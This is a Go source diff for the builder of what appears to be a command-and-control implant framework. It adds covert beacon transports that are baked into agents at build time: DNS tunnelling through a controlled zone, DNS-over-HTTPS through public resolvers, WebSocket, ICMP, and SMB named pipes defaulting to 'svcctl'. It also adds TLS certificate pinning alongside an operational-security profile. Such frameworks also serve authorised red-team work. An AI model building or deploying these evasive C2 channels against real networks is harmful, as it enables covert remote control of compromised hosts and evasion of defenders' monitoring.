@@ -77,6 +77,26 @@ type Config struct {
 
 	Profile     *OpsecProfile
 	InsecureTLS bool // bake InsecureSkipVerify=true into agent (for self-signed C2 certs)
+	CertPin     string // SHA-256 hex fingerprint of expected server TLS leaf cert (HTTPS only)
+
+	// Transport selection (default = http when empty).
+	// Valid values: http | https | ws | doh | dns | icmp | smb
+	Transport string
+
+	// WebSocket transport
+	WSServerURL string // ws:// or wss:// URL; defaults to ServerURL with scheme rewritten
+
+	// DNS transport (native, agent → authoritative DNS server)
+	DNSDomain string // C2-controlled zone (e.g. tunnel.example.com)
+	DNSServer string // host:port of authoritative DNS server (default: ServerURL host + :5353)
+
+	// DNS-over-HTTPS transport (agent → public DoH resolver → authoritative zone)
+	DOHDomain   string // C2-controlled zone (e.g. tunnel.example.com)
+	DOHProvider string // "cloudflare" | "google" (default: cloudflare)
+
+	// SMB named-pipe transport (agent → relay host)
+	SMBRelay string // relay host or IP (e.g. 192.168.1.5)
+	SMBPipe  string // pipe name (default: "svcctl")
 }
 
 // Result holds the outcome of a build.
@@ -152,6 +172,57 @@ func (g *Generator) Build(cfg *Config) (*Result, error) {
 
 	if cfg.InsecureTLS {
 		ldflags += " -X main.defaultInsecureTLS=true"
+	}
+	if cfg.CertPin != "" {
+		ldflags += " -X main.defaultCertPin=" + cfg.CertPin
+	}
+
+	// Transport selection — agent main.go reads `defaultTransport` and
+	// transport-specific *Server*/Domain/Pipe build vars to choose its loop.
+	// "http" (or empty) is the default and needs no extra ldflags.
+	switch cfg.Transport {
+	case "", "http", "https":
+		// HTTP/HTTPS: agent uses ServerURL directly; no extra vars needed.
+		// (HTTPS is selected at build time by giving an https:// ServerURL.)
+		if cfg.Transport != "" {
+			ldflags += " -X main.defaultTransport=" + cfg.Transport
+		}
+	case "ws":
+		ldflags += " -X main.defaultTransport=ws"
+		if cfg.WSServerURL != "" {
+			ldflags += " -X main.defaultWSServerURL=" + cfg.WSServerURL
+		}
+	case "dns":
+		ldflags += " -X main.defaultTransport=dns"
+		if cfg.DNSDomain != "" {
+			ldflags += " -X main.defaultDNSDomain=" + cfg.DNSDomain
+		}
+		if cfg.DNSServer != "" {
+			ldflags += " -X main.defaultDNSServer=" + cfg.DNSServer
+		}
+	case "doh":
+		ldflags += " -X main.defaultTransport=doh"
+		if cfg.DOHDomain != "" {
+			ldflags += " -X main.defaultDOHDomain=" + cfg.DOHDomain
+		}
+		if cfg.DOHProvider != "" {
+			ldflags += " -X main.defaultDOHProvider=" + cfg.DOHProvider
+		}
+	case "icmp":
+		ldflags += " -X main.defaultTransport=icmp"
+		// NOTE: ICMP server-side listener (cmd/listener/icmp_listener.go) is
+		// not yet implemented — see ROADMAP 11.4. Agent will beacon but
+		// receive no replies until that ships.
+	case "smb":
+		ldflags += " -X main.defaultTransport=smb"
+		if cfg.SMBRelay != "" {
+			ldflags += " -X main.defaultSMBRelay=" + cfg.SMBRelay
+		}
+		if cfg.SMBPipe != "" {
+			ldflags += " -X main.defaultSMBPipe=" + cfg.SMBPipe
+		}
+	default:
+		return nil, fmt.Errorf("unknown transport %q (want: http|https|ws|doh|dns|icmp|smb)", cfg.Transport)
 	}
 
 	if cfg.StripSyms {
